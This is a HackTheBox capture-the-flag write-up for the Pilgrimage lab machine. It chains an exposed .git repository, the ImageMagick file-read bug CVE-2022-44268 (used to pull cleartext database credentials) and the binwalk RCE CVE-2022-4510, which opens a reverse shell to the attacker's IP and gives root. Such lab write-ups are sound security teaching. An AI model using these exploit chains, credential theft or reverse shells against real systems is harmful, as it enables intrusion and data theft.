---
render_with_liquid: false
title: HackTheBox Writeup  Pilgrimage
date: 2023-06-28 23:11:38 +1400
tags: [hackthebox, linux, nmap, feroxbuster, exiftool, git, git-dumper, githacker, php, image-magick, searchsploit, cve-2022-44268, file-read, xxd, sqlite, clear-text-credentials, pspy, bash-script, binwalk-cve, cve-2022-4510]
---




# Recon
---


## Get Domain Name

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ curl 10.129.70.220 -I
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Wed, 28 Jun 2023 15:08:18 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://pilgrimage.htb/
```

Add to hosts

```bash
echo '10.129.70.220 pilgrimage.htb' | sudo tee -a /etc/hosts
```


## Nmap

```bash

# Nmap 7.94 scan initiated Wed Jun 28 23:11:38 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA pilgrimage pilgrimage.htb
Nmap scan report for pilgrimage.htb (10.129.70.220)
Host is up, received user-set (0.27s latency).
Scanned at 2023-06-28 23:11:38 CST for 754s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-git:
|   10.129.70.220:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-methods:
|_  Supported Methods: GET HEAD POST
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Jun 28 23:24:12 2023 -- 1 IP address (1 host up) scanned in 753.48 seconds
```


## 80 - Website


### Info

Online Image Shrinker

![](/assets/obsidian/f2341d9fc15005ac603aa05e50cf47f5.png)


### Directory

```bash
feroxbuster -u http://pilgrimage.htb --burp -t 100
```

```bash
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://pilgrimage.htb/assets => http://pilgrimage.htb/assets/
301      GET        7l       11w      169c http://pilgrimage.htb/tmp => http://pilgrimage.htb/tmp/
200      GET       94l      234w     3576c http://pilgrimage.htb/assets/css/custom.css
200      GET      171l      403w     6173c http://pilgrimage.htb/register.php
200      GET      186l      505w     4928c http://pilgrimage.htb/assets/css/owl.css
200      GET      178l      395w     5292c http://pilgrimage.htb/assets/js/custom.js
302      GET        0l        0w        0c http://pilgrimage.htb/logout.php => http://pilgrimage.htb/
200      GET      171l      403w     6166c http://pilgrimage.htb/login.php
302      GET        0l        0w        0c http://pilgrimage.htb/dashboard.php => http://pilgrimage.htb/login.php
200      GET        5l       27w     1031c http://pilgrimage.htb/assets/js/popup.js
200      GET        2l     1283w    86927c http://pilgrimage.htb/vendor/jquery/jquery.min.js
200      GET       11l      552w    57997c http://pilgrimage.htb/assets/css/animate.css
200      GET        7l      942w    60110c http://pilgrimage.htb/vendor/bootstrap/js/bootstrap.min.js
200      GET     2349l     5229w    50334c http://pilgrimage.htb/assets/css/templatemo-woox-travel.css
200      GET       15l     1928w   119998c http://pilgrimage.htb/assets/js/isotope.min.js
200      GET     6805l    11709w   123176c http://pilgrimage.htb/assets/css/fontawesome.css
200      GET        7l     2223w   194705c http://pilgrimage.htb/vendor/bootstrap/css/bootstrap.min.css
301      GET        7l       11w      169c http://pilgrimage.htb/assets/css => http://pilgrimage.htb/assets/css/
301      GET        7l       11w      169c http://pilgrimage.htb/assets/js => http://pilgrimage.htb/assets/js/
301      GET        7l       11w      169c http://pilgrimage.htb/assets/images => http://pilgrimage.htb/assets/images/
200      GET    16582l    60225w   485937c http://pilgrimage.htb/assets/js/tabs.js
200      GET      198l      494w     7621c http://pilgrimage.htb/
301      GET        7l       11w      169c http://pilgrimage.htb/vendor => http://pilgrimage.htb/vendor/
301      GET        7l       11w      169c http://pilgrimage.htb/vendor/jquery => http://pilgrimage.htb/vendor/jquery/
[###########>--------] - 7m    141973/240026  0s      found:24      errors:652
[###################>] - 16m   228098/240026  0s      found:24      errors:19769
[####################] - 17m   240026/240026  0s      found:24      errors:21735
[####################] - 16m    30000/30000   31/s    http://pilgrimage.htb/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/assets/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/tmp/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/assets/css/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/assets/js/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/assets/images/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/vendor/
[####################] - 17m    30000/30000   30/s    http://pilgrimage.htb/vendor/jquery/                                                      
```


# User Flag
---


## Dump `.git`

Visit `http://pilgrimage.htb/.git`

![](/assets/obsidian/e126bc441888d1a8cbc0f86a29313e9a.png)

Although it shows 403, but config file is still accessible, which means git dump is likely possible

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ curl http://pilgrimage.htb/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
```

Use [GitHacker](https://github.com/WangYihang/GitHacker) for better result than **git-dump**

```bash
githacker --url http://pilgrimage.htb/.git/ --output-folder git_dump
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ git branch
* master

┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ git log
commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -> master)
Author: emily <emily@pilgrimage.htb>
Date:   Wed Jun 7 20:11:48 2023 +1000

    Pilgrimage image shrinking service initial commit.
```

- Seems like it's using a library to prevent file upload bypass!

![](/assets/obsidian/5b865c81631cacc538f76486ccf140d4.png)

> index.php

```bash
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
```


## Exploit ImageMagick

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ chmod +x ./magick

┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

```bash
searchsploit ImageMagick 7.1.0
```

![](/assets/obsidian/24fd4360590a65705bed1d13b97c5855.png)

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ searchsploit -m 51261.txt
  Exploit: ImageMagick 7.1.0-49 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/51261
     Path: /usr/share/exploitdb/exploits/multiple/local/51261.txt
    Codes: CVE-2022-44268
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/Pilgrimage/git_dumper/51261.txt


┌──(kali㉿kali)-[~/htb/Pilgrimage/git_dumper]
└─$ cat 51261.txt

# Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read

# Google Dork: N/A

# Date: 06/02/2023

# Exploit Author: Cristian 'void' Giustini

# Vendor Homepage: https://imagemagick.org/

# Software Link: https://imagemagick.org/

# Version: <= 7.1.0-49

# Tested on: 7.1.0-49 and 6.9.11-60

# CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team
https://www.metabaseq.com/imagemagick-zero-days/)

# Exploit pre-requirements: Rust



# PoC : https://github.com/voidz0r/CVE-2022-44268 
```

```bash
git clone https://github.com/voidz0r/CVE-2022-44268
cd CVE-2022-44268
cargo run "/etc/passwd"
```

![](/assets/obsidian/bac64f5f039ca0f74b9ef1d867ecf27e.png)

Upload the generated image

- Tested the exploit and it works

The source code revealed a sqlite DB location : `/var/db/pilgrimage`

Grab `/var/db/pilgrimage`

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage/CVE-2022-44268]
└─$ cargo run "/var/db/pilgrimage"
    Finished dev [unoptimized + debuginfo] target(s) in 0.19s
     Running `target/debug/cve-2022-44268 /var/db/pilgrimage`
```

Upload image payload then get shrunk image

![](/assets/obsidian/a976285aa6d6096e9edd17db289a73a9.png)

```bash
wget http://pilgrimage.htb/shrunk/649d34ac17308.png
identify -verbose 649d00252ca6e.png
```

![](/assets/obsidian/87496b683f290bef1f1a7aea86d6bf5c.png)

Output the hex to binary

```bash
vi dump.hex
xxd -r -p dump.hex dump.db
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ sqlite3 dump.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
images  users
sqlite> select * from users;
emily|abigchonkyboi123
adminChiao|123456
sqlite>
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ sshpass -p 'abigchonkyboi123' ssh -o "StrictHostKeyChecking no" emily@pilgrimage.htb
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jun 29 15:35:16 2023 from 10.10.14.72
emily@pilgrimage:~$ cat user.txt
43f874ee6d5ddb3265a157318086df37
```


# Root Flag
---

```bash
mkdir www && cd www
ln -s /opt/sectools/privesc/pspy64
python -m http.server 80
```

```bash
cd /tmp
wget 10.10.14.72/pspy64 -O pspy
chmod +x ./pspy
./pspy
```

![](/assets/obsidian/c0ca82e09121581835492cd19ec4d784.png)

```bash
emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh

#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

emily@pilgrimage:/tmp$ binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
...
```

```bash
searchsploit "Binwalk v2.3.2"
```

![](/assets/obsidian/8e5802d20613adc174c22f48786a79d3.png)

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ searchsploit -m 51249
  Exploit: Binwalk v2.3.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines (614)
Copied to: /home/kali/htb/Pilgrimage/51249.py

┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ vi 51249.py

┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ python 51249.py ~/Pictures/HackerCat.jpg 10.10.14.72 1111


################################################
------------------CVE-2022-4510----------------

################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------

################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------

################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ sshpass -p 'abigchonkyboi123' scp binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/a.png
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.219] 42850
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root/quarantine
cat ../root.txt
9c42c5b4db2b675ace74131d6ba329c4
```


# Additional
---

## Failed Attempts


### exploit Exiftool

Upload an image

![](/assets/obsidian/ce722c1e48c179dfe05509bcdd2b6b75.png)

Download image

```bash
wget http://pilgrimage.htb/shrunk/649c4f505dfb4.jpeg
```

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage]
└─$ exiftool 649c4f505dfb4.jpeg
ExifTool Version Number         : 12.63
File Name                       : 649c4f505dfb4.jpeg
Directory                       : .
File Size                       : 96 kB
File Modification Date/Time     : 2023:06:28 23:18:40+08:00
File Access Date/Time           : 2023:06:28 23:25:42+08:00
File Inode Change Date/Time     : 2023:06:28 23:25:42+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Current IPTC Digest             : 2b3df19b0c67788262a0d0dced3b6d58
Coded Character Set             : UTF8
Envelope Record Version         : 4
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 300
Y Resolution                    : 300
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
XMP Toolkit                     : Image::ExifTool 11.88
Creator Tool                    : Adobe Stock Platform
Document ID                     : xmp.iid:d2704a20-0e15-40e8-822c-520d6e1ce645
Instance ID                     : adobe:docid:stock:c0b8ab92-a0c9-4d90-92d9-da4084ce1fbe
Original Document ID            : adobe:docid:stock:569884308
Image Width                     : 500
Image Height                    : 334
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 500x334
Megapixels                      : 0.167
```

It's created by `exiftool 11.88`, which is pretty old compare to latest release at 2023/6/8 version `12.63`

search `exiftool 11.88 exploit

> https://github.com/convisolabs/CVE-2021-22204-exiftool

```bash
┌──(kali㉿kali)-[~/htb/Pilgrimage/CVE-2021-22204-exiftool]
└─$ vi exploit.py

┌──(kali㉿kali)-[~/htb/Pilgrimage/CVE-2021-22204-exiftool]
└─$ python exploit.py
    1 image files updated
```

![](/assets/obsidian/4806fb8cba2c1695cc6a8605c99eaf24.png)

The exploit failed

